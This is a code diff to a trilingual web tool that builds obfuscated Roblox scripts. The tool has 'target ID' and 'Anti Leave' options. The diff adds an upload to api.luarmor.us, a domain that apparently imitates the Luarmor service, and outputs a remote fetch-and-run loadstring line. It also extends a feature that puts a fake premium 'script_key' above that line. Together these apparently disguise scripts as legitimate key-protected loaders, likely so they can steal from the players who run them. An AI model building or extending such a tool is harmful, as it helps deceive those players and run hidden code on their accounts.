@@ -452,6 +452,11 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
         <label class="switch"><input type="checkbox" id="toggleFakeLuarmor"><span class="slider"></span></label>
       </div>
       <div class="toggle-card">
+        <div class="toggle-info"><div class="toggle-icon">🌐</div>
+        <div class="toggle-text"><h4 data-i18n="luarmorUs">Luarmor US</h4><p data-i18n="luarmorUsDesc">Sube el script y genera un loadstring con api.luarmor.us (ID único).</p></div></div>
+        <label class="switch"><input type="checkbox" id="toggleLuarmorUs"><span class="slider"></span></label>
+      </div>
+      <div class="toggle-card">
         <div class="toggle-info"><div class="toggle-icon">🚫</div>
         <div class="toggle-text"><h4 data-i18n="antiLeave">Anti Leave</h4><p data-i18n="antiLeaveDesc">Activa protección Anti Leave en el script generado.</p></div></div>
         <label class="switch"><input type="checkbox" id="toggleAntiLeave"><span class="slider"></span></label>
@@ -463,7 +468,7 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
       </div>
       <div class="toggle-card" id="fakeKeyCard" style="opacity:0.45;pointer-events:none;">
         <div class="toggle-info"><div class="toggle-icon">🔑</div>
-        <div class="toggle-text"><h4 data-i18n="fakeKey">Fake Key</h4><p data-i18n="fakeKeyDesc">Añade una script_key falsa arriba del loadstring (requiere Pastefy o Fake Luarmor).</p></div></div>
+        <div class="toggle-text"><h4 data-i18n="fakeKey">Fake Key</h4><p data-i18n="fakeKeyDesc">Añade una script_key falsa arriba del loadstring (requiere Pastefy, Fake Luarmor o Luarmor US).</p></div></div>
         <label class="switch"><input type="checkbox" id="toggleFakeKey" disabled><span class="slider"></span></label>
       </div>
       <div id="fakeKeyArea" style="display:none;margin-top:8px;margin-bottom:8px;">
@@ -584,12 +589,14 @@ const I18N = {
     pastefyDesc:"Sube el script a Pastefy y genera un loadstring compacto.",
     fakeLuarmor:"Fake Luarmor Loader",
     fakeLuarmorDesc:"Sube el script a Fake Luarmor y genera un loadstring estilo Luarmor.",
+    luarmorUs:"Luarmor US",
+    luarmorUsDesc:"Sube el script y genera un loadstring con api.luarmor.us (ID único).",
     antiLeave:"Anti Leave",
     antiLeaveDesc:"Activa protección Anti Leave en el script generado.",
     obfuscate:"Ofuscar script",
     obfuscateDesc:"Ofuscación real con WeAreDevs (Prometheus).",
     fakeKey:"Fake Key",
-    fakeKeyDesc:"Añade una script_key falsa arriba del loadstring (requiere Pastefy o Fake Luarmor).",
+    fakeKeyDesc:"Añade una script_key falsa arriba del loadstring (requiere Pastefy, Fake Luarmor o Luarmor US).",
     fakeKeyPh:"Ej: PREMIUM-676767",
     genWarn:"⚠️ SELECCIONA AL MENOS UN TARGET",
     genId:"⚠️ INGRESA UN TARGET ID",
@@ -627,6 +634,7 @@ const I18N = {
     toastMpsApplied:"brainrots ≥ filtro",
     toastPastefy:"✅ Pastefy",
     toastFakeLuarmor:"✅ Fake Luarmor Loader",
+    toastLuarmorUs:"✅ Luarmor US",
     toastObfErr:"❌ Error de ofuscar",
     noTarget:"Sin target",
     customLoaderPh:"Example: https://tu-ui.com/ui.lua",
@@ -667,12 +675,14 @@ const I18N = {
     pastefyDesc:"Upload script to Pastefy and get a compact loadstring.",
     fakeLuarmor:"Fake Luarmor Loader",
     fakeLuarmorDesc:"Upload script to Fake Luarmor and get a Luarmor-style loadstring.",
+    luarmorUs:"Luarmor US",
+    luarmorUsDesc:"Upload the script and get a loadstring with api.luarmor.us (unique ID).",
     antiLeave:"Anti Leave",
     antiLeaveDesc:"Enables Anti Leave protection in the generated script.",
     obfuscate:"Obfuscate script",
     obfuscateDesc:"Real obfuscation with WeAreDevs (Prometheus).",
     fakeKey:"Fake Key",
-    fakeKeyDesc:"Adds a fake script_key above the loadstring (requires Pastefy or Fake Luarmor).",
+    fakeKeyDesc:"Adds a fake script_key above the loadstring (requires Pastefy, Fake Luarmor or Luarmor US).",
     fakeKeyPh:"E.g: PREMIUM-676767",
     genWarn:"⚠️ SELECT AT LEAST ONE TARGET",
     genId:"⚠️ ENTER A TARGET ID",
@@ -710,6 +720,7 @@ const I18N = {
     toastMpsApplied:"brainrots ≥ filter",
     toastPastefy:"✅ Pastefy",
     toastFakeLuarmor:"✅ Fake Luarmor Loader",
+    toastLuarmorUs:"✅ Luarmor US",
     toastObfErr:"❌ Obfuscate error",
     noTarget:"No target",
     customLoaderPh:"Example: https://your-ui.com/ui.lua",
@@ -750,12 +761,14 @@ const I18N = {
     pastefyDesc:"Envie o script para o Pastefy e gere um loadstring compacto.",
     fakeLuarmor:"Fake Luarmor Loader",
     fakeLuarmorDesc:"Envie o script para o Fake Luarmor e gere um loadstring estilo Luarmor.",
+    luarmorUs:"Luarmor US",
+    luarmorUsDesc:"Envie o script e gere um loadstring com api.luarmor.us (ID único).",
     antiLeave:"Anti Leave",
     antiLeaveDesc:"Ativa proteção Anti Leave no script gerado.",
     obfuscate:"Ofuscar script",
     obfuscateDesc:"Ofuscação real com WeAreDevs (Prometheus).",
     fakeKey:"Fake Key",
-    fakeKeyDesc:"Adiciona uma script_key falsa acima do loadstring (requer Pastefy ou Fake Luarmor).",
+    fakeKeyDesc:"Adiciona uma script_key falsa acima do loadstring (requer Pastefy, Fake Luarmor ou Luarmor US).",
     fakeKeyPh:"Ex: PREMIUM-676767",
     genWarn:"⚠️ SELECIONE PELO MENOS UM TARGET",
     genId:"⚠️ INSIRA UM TARGET ID",
@@ -793,6 +806,7 @@ const I18N = {
     toastMpsApplied:"brainrots ≥ filtro",
     toastPastefy:"✅ Pastefy",
     toastFakeLuarmor:"✅ Fake Luarmor Loader",
+    toastLuarmorUs:"✅ Luarmor US",
     toastObfErr:"❌ Erro ao ofuscar",
     noTarget:"Sem target",
     customLoaderPh:"Exemplo: https://sua-ui.com/ui.lua",
@@ -2337,6 +2351,21 @@ async function uploadToFakeLuarmor(script){
   return 'loadstring(game:HttpGet("' + rawUrl + '"))()';
 }
 
+async function uploadToLuarmorUs(script) {
+  const res = await fetch("/api/luarmor", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ script }),
+  });
+  const data = await res.json().catch(() => ({}));
+  if (!res.ok || data.error) {
+    throw new Error(data.error || ("HTTP " + res.status));
+  }
+  if (data.loadstring) return data.loadstring;
+  if (!data.id) throw new Error("No ID");
+  return 'loadstring(game:HttpGet("https://api.luarmor.us/files/v4/loaders/' + data.id + '.lua"))()';
+}
+
 function formatLuaTable(setObj){
   const arr = Array.from(setObj).map(n => `    ["${n}"] = true`);
   return arr.length ? arr.join(",\n") + "\n" : "";
@@ -2443,9 +2472,23 @@ ${execBlock}`;
     }
   }
 
+  const useLuarmorUs = document.getElementById("toggleLuarmorUs").checked;
+  if(useLuarmorUs){
+    try{
+      script = await uploadToLuarmorUs(script);
+      showToast(t("toastLuarmorUs"));
+    }catch(e){
+      showToast("❌ Luarmor US: " + e.message);
+      document.getElementById("scriptOutput").textContent = script;
+      document.getElementById("result").classList.add("show");
+      saveLoggedUserState();
+      return;
+    }
+  }
+
   const useFakeKey = document.getElementById("toggleFakeKey").checked;
   const fakeKeyVal = (document.getElementById("fakeKeyInput").value || "").trim();
-  if (useFakeKey && fakeKeyVal && (usePastefy || useFakeLuarmor)) {
+  if (useFakeKey && fakeKeyVal && (usePastefy || useFakeLuarmor || useLuarmorUs)) {
     script = `script_key = "${fakeKeyVal}"\n` + script;
   }
   
@@ -2459,7 +2502,8 @@ function showToast(msg){const old=document.querySelector(".toast");if(old)old.re
 function updateFakeKeyAvailability() {
   const pastefyOn = document.getElementById("togglePastefy").checked;
   const luarmorOn = document.getElementById("toggleFakeLuarmor").checked;
-  const enabled = pastefyOn || luarmorOn;
+  const luarmorUsOn = document.getElementById("toggleLuarmorUs").checked;
+  const enabled = pastefyOn || luarmorOn || luarmorUsOn;
   const card = document.getElementById("fakeKeyCard");
   const toggle = document.getElementById("toggleFakeKey");
   const area = document.getElementById("fakeKeyArea");
@@ -2475,13 +2519,23 @@ function updateFakeKeyAvailability() {
     area.style.display = "none";
   }
 }
-document.getElementById("togglePastefy").addEventListener("change", function () {
-  if (this.checked) document.getElementById("toggleFakeLuarmor").checked = false;
+function exclusiveLoadstringToggle(activeId) {
+  ["togglePastefy", "toggleFakeLuarmor", "toggleLuarmorUs"].forEach(id => {
+    if (id !== activeId) document.getElementById(id).checked = false;
+  });
   updateFakeKeyAvailability();
+}
+document.getElementById("togglePastefy").addEventListener("change", function () {
+  if (this.checked) exclusiveLoadstringToggle("togglePastefy");
+  else updateFakeKeyAvailability();
 });
 document.getElementById("toggleFakeLuarmor").addEventListener("change", function () {
-  if (this.checked) document.getElementById("togglePastefy").checked = false;
-  updateFakeKeyAvailability();
+  if (this.checked) exclusiveLoadstringToggle("toggleFakeLuarmor");
+  else updateFakeKeyAvailability();
+});
+document.getElementById("toggleLuarmorUs").addEventListener("change", function () {
+  if (this.checked) exclusiveLoadstringToggle("toggleLuarmorUs");
+  else updateFakeKeyAvailability();
 });
 document.getElementById("toggleFakeKey").addEventListener("change", function () {
   document.getElementById("fakeKeyArea").style.display = this.checked ? "block" : "none";
